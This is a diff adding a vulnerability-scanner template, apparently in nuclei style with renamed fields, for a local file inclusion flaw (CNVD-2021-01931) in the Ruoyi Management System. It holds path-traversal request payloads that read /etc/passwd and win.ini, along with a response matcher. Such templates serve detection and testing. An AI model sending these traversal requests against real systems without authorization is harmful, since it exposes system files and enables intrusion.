@@ -1,0 +1,26 @@
+id: CNVD-2021-01931
+brief:
+    title: Ruoyi Management System - Local File Inclusion
+    by: daffainfo
+    level: high
+    about: The Ruoyi Management System contains a local file inclusion vulnerability that allows attackers to retrieve arbitrary files from the operating system.
+    label:
+        - cnvd
+        - cnvd2021
+        - ruoyi
+        - lfi
+        - vuln
+    score: CVSS:8.6
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/common/download/resource?resource=/profile/../../../../etc/passwd'
+        - '{{BaseURL}}/common/download/resource?resource=/profile/../../../../Windows/win.ini'
+      signs:
+        - "on": word
+          has:
+            - bit app support
+            - fonts
+            - extensions
+          in: body
+          need: all
